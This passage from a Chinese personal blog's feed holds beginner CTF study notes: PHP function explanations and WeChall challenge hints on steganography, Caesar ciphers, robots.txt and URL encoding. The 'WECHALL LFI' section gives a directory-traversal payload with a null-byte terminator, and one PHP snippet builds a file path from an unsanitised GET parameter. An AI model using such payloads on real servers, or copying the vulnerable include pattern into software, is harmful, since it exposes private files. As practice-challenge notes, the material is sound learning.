class="string">"5"</span> cols=<span class="string">"40"</span>&gt;</span><br></pre></td></tr></table></figure><p>preg_match（）函数在字符串中搜索模式，如果存在模式，则返回true，否则返回false。<br>正则表达式</p><p>include和require语句相同，但失败时除外：<br>require 将产生致命错误（E_COMPILE_ERROR）并停止脚本</p><h5 id="include-只会产生警告（E-WARNING）并且脚本将继续"><a href="#include-只会产生警告（E-WARNING）并且脚本将继续" class="headerlink" title="include 只会产生警告（E_WARNING）并且脚本将继续"></a>include 只会产生警告（E_WARNING）并且脚本将继续</h5><p>该readfile()函数读取文件并将其写入输出缓冲区。</p><p>&lt;?php<br>$myfile = fopen(“webdictionary.txt”, “r”) or die(“Unable to open file!”);<br>echo fread($myfile,filesize(“webdictionary.txt”));<br>fclose($myfile);<br>?&gt;</p><p>该fclose()功能用于关闭打开的文件。<br>结束所有文件后，关闭所有文件是一种良好的编程习惯。您不希望在服务器上到处运行打开的文件占用资源！</p><p>该feof()功能检查是否已达到“文件结尾”（EOF）。</p><p>该fopen()函数还用于创建文件。可能有些混乱，但是在PHP中，使用与打开文件相同的功能创建文件。</p><p>$filename = ‘pages/‘.(isset($_GET[“file”])$_GET[“file”]:”welcome”).’.html’;</p><p>？ ：</p><h5 id="isset（）函数检查是否设置了变量，这意味着必须声明该变量并且该变量不能为NULL。"><a href="#isset（）函数检查是否设置了变量，这意味着必须声明该变量并且该变量不能为NULL。" class="headerlink" title="isset（）函数检查是否设置了变量，这意味着必须声明该变量并且该变量不能为NULL。"></a>isset（）函数检查是否设置了变量，这意味着必须声明该变量并且该变量不能为NULL。</h5><p>die（）函数是exit（）函数的别名。</p><h5 id="eval（）函数将字符串评估为PHP代码。"><a href="#eval（）函数将字符串评估为PHP代码。" class="headerlink" title="eval（）函数将字符串评估为PHP代码。"></a>eval（）函数将字符串评估为PHP代码。</h5><h5 id="dirname（）函数返回父目录的路径。"><a href="#dirname（）函数返回父目录的路径。" class="headerlink" title="dirname（）函数返回父目录的路径。"></a>dirname（）函数返回父目录的路径。</h5><h5 id="in-array（）函数在数组中搜索特定值。"><a href="#in-array（）函数在数组中搜索特定值。" class="headerlink" title="in_array（）函数在数组中搜索特定值。"></a>in_array（）函数在数组中搜索特定值。</h5><p>注意：如果搜索参数是字符串，并且类型参数设置为TRUE，则搜索区分大小写。</p><h3 id="WECHALL-LFI"><a href="#WECHALL-LFI" class="headerlink" title="WECHALL LFI"></a>WECHALL LFI</h3><p>?file=page/jhkd.html<br>?file=../../solution.php%00<br>%00 后的字符不算，已经更改<br>../ 遍历目录</p><p>switch ($which)<br>        {<br>        case 0:<br>        case 1:<br>        case 2:<br>                require_once $which.’.php’;<br>                break;<br>        default:<br>                echo GWF_HTML::error(‘PHP-0817’, ‘Hacker NoNoNo!’, false);<br>                break;<br>        }<br>which=0,1,2 都执行require_once</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;什么是PHP文件？&quot;&gt;&lt;a href=&quot;#什么是PHP文件？&quot; class=&quot;headerlink&quot; title=&quot;什么是PHP文件？&quot;&gt;&lt;/a&gt;什么是PHP文件？&lt;/h3&gt;&lt;p&gt;PHP文件可以包含文本，HTML，CSS，JavaScript和PHP代码&lt;br&gt;PHP代码在服务器上执行，结果以纯HTML格式返回到浏览器&lt;br&gt;PHP文件的扩展名为“ .php”&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="http://finsenty54.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CTF入门 WECALL</title>
    <link href="http://finsenty54.github.io/2020/05/15/CTF%E5%85%A5%E9%97%A8%20WECALL/"/>
    <id>http://finsenty54.github.io/2020/05/15/CTF入门 WECALL/</id>
    <published>2020-05-15T11:24:57.000Z</published>
    <updated>2020-05-15T11:26:23.799Z</updated>
    
    <content type="html"><![CDATA[<p>初学CTF 入门太难</p><h2 id="wecall-challenges-解决方法"><a href="#wecall-challenges-解决方法" class="headerlink" title="wecall challenges 解决方法"></a>wecall challenges 解决方法</h2><h4 id="training-steganoI"><a href="#training-steganoI" class="headerlink" title="training steganoI"></a>training steganoI</h4><p>$cat  xxx.bmp<br><a href="https://www.tecmint.com/13-basic-cat-command-examples-in-linux/" target="_blank" rel="noopener">https://www.tecmint.com/13-basic-cat-command-examples-in-linux/</a></p><h4 id="Crypto-Caesar-I"><a href="#Crypto-Caesar-I" class="headerlink" title="Crypto - Caesar I"></a>Crypto - Caesar I</h4><p>python函数 list() ord() chr()</p><a id="more"></a><h4 id="WWW-Robots"><a href="#WWW-Robots" class="headerlink" title="WWW-Robots"></a>WWW-Robots</h4><p>robots.txt<br>The robots.txt file is used by web crawlers to check if they are allowed to crawl and index your website or only parts of it.<br>Sometimes these files reveal the directory structure instead protecting the content from being crawled.</p><h4 id="URL-ENCODE"><a href="#URL-ENCODE" class="headerlink" title="URL ENCODE"></a>URL ENCODE</h4><p>URL encoding replaces unsafe ASCII characters with a “%” followed by two hexadecimal digits. 十六进制<br>URLs cannot contain spaces. URL encoding normally replaces a space with a plus (+) sign or with %20.<br>URLs can only be sent over the Internet using the ASCII character-set.</p><h4 id="python-3-7"><a href="#python-3-7" class="headerlink" title="python 3.7"></a>python 3.7</h4><p>from urllib.parse import unquote<br>tar -xf 解压缩 ？自动识别<br>java -jar </p><h4 id="Training-Programming-1"><a href="#Training-Programming-1" class="headerlink" title="Training: Programming 1"></a>Training: Programming 1</h4><p>urllib.request</p><p>urlopen返回的是二进制数据，decode(‘utf-8’)解码</p><h4 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h4><p><a href="https://zh.wikipedia.org/wiki/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F</a></p><p>‘weshall’</p><p>wechall4?.(jpg|gif|tiff|bmp|png)</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;初学CTF 入门太难&lt;/p&gt;
&lt;h2 id=&quot;wecall-challenges-解决方法&quot;&gt;&lt;a href=&quot;#wecall-challenges-解决方法&quot; class=&quot;headerlink&quot; title=&quot;wecall challenges 解决方法&quot;&gt;&lt;/a&gt;wecall challenges 解决方法&lt;/h2&gt;&lt;h4 id=&quot;training-steganoI&quot;&gt;&lt;a href=&quot;#training-steganoI&quot; class=&quot;headerlink&quot; title=&quot;training steganoI&quot;&gt;&lt;/a&gt;training steganoI&lt;/h4&gt;&lt;p&gt;$cat  xxx.bmp&lt;br&gt;&lt;a href=&quot;https://www.tecmint.com/13-basic-cat-command-examples-in-linux/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.tecmint.com/13-basic-cat-command-examples-in-linux/&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;Crypto-Caesar-I&quot;&gt;&lt;a href=&quot;#Crypto-Caesar-I&quot; class=&quot;headerlink&quot; title=&quot;Crypto - Caesar I&quot;&gt;&lt;/a&gt;Crypto - Caesar I&lt;/h4&gt;&lt;p&gt;python函数 list() ord() chr()&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="http://finsenty54.github.io/tags/CTF/"/>
    
  </entry>
  
</feed>
